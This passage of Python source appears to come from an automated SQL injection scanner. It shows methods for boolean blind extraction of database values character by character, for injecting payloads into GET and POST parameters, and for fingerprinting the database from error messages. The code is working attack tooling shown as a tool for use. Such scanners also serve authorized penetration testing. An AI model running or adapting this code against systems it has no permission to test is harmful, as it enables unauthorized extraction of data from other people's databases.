        query: str,
        max_length: int = 64,
    ) -> str:
        """Extract a full string value using boolean bit-by-bit extraction"""
        # Get baseline
        try:
            baseline = await self._send_payload(url, param, "1", method, base_data)
            baseline_len = len(baseline.text) if baseline else 0
        except Exception:
            return ""

        result = []
        for pos in range(1, max_length + 1):
            char = await self._extract_char_boolean(
                url, param, method, base_data, query, pos, baseline_len
            )
            if not char:
                break
            result.append(char)
        return "".join(result)

    def _is_true_response(self, resp, baseline_len: int) -> bool:
        """Determine if a response represents a TRUE SQL condition"""
        if not resp:
            return False
        # True response: status 200 and length close to baseline
        if resp.status_code != 200:
            return False
        return abs(len(resp.text) - baseline_len) < 100

    # ─── Utility Methods ──────────────────────────────────────────────────────

    async def _send_payload(
        self,
        url: str,
        param: str,
        payload: str,
        method: str,
        base_data: dict,
    ):
        """Send a payload via GET or POST"""
        try:
            if method == "POST":
                data = dict(base_data)
                data[param] = payload
                return await self.post(url, data=data)
            else:
                return await self.get(self._inject_param(url, param, payload))
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _has_sql_error(self, text: str) -> bool:
        """Check if response contains a SQL error signature"""
        if not text:
            return False
        for pattern in ALL_SQL_ERRORS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _detect_db(self, text: str) -> str:
        """Detect database type from error message"""
        if not text:
            return "Unknown"
        for db_name, patterns in SQL_ERRORS.items():
            if db_name == "Generic":
                continue
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return db_name
        # Fall back to Generic
        for pattern in SQL_ERRORS["Generic"]:
            if re.search(pattern, text, re.IGNORECASE):
                return "Generic"
        return "Unknown"

    def _extract_error(self, text: str) -> str:
        """Extract a short SQL error snippet from response text"""
        if not text:
            return "SQL error detected"
        for pattern in ALL_SQL_ERRORS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 20)
                end = min(len(text), match.end() + 100)
                snippet = text[start:end].strip()
                # Collapse whitespace for readability
                snippet = re.sub(r"\s+", " ", snippet)
                return snippet[:300]
        return "SQL error detected"
